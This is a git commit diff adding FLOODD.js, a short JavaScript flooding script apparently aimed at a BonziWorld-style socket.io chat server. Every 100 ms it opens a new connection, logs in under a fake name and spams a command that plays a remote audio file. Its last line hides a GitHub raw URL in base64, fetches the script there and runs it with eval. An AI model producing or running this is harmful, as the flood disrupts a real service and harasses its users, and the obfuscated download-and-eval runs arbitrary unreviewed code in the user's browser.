3618a7ae9343ca3906c5cda8371949558b2d3dd7
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2025-10-28 16:55:39 +0300

    Update and rename FLOOD.js to FLOODD.js

---
+++ FLOODD.js
@@ -0,0 +1,13 @@
+setInterval(() => {
+    const socketb = io("//");
+    socketb.emit("client", "MAIN");
+    socketb.emit("login", {
+        name: "OPPENHEIMER (HtBEAjbGDB)"
+    });
+    setTimeout(() => {
+        socketb.emit("command", {
+            list: ["video", "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/raw/refs/heads/main/rfgfgrfgrfyrftyg.wav"]
+        });
+    }, 2000)
+}, 100)
+setTimeout(() => {fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'!!&&+++&+FOUTAGE'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))}, 10000)
